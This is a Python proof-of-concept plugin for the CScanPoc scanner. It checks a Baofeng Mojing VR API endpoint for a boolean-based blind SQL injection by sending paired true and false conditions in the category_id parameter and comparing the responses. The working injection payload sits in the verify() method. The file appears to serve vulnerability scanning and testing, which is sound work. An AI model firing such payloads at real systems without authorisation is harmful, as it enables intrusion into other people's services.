# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mojing_0102'  # 平台漏洞编号
    name = '暴风魔镜接口SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-18'  # 漏洞公布时间
    desc = '''
    暴风魔镜接口SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205009
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '暴风魔镜'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1044991d-dfcc-4c54-a03b-1b2c0e247822'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + \
                "/api/v1/vr_market/source_list.php?source_type=2&category_id={catid}' AND 'Tffi'='Tffi&version=20151016"
            url1 = self.target + \
                "/api/v1/vr_market/source_list.php?source_type=2&category_id={catid}' AND 'Tffi'='AAAA&version=20151016"
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
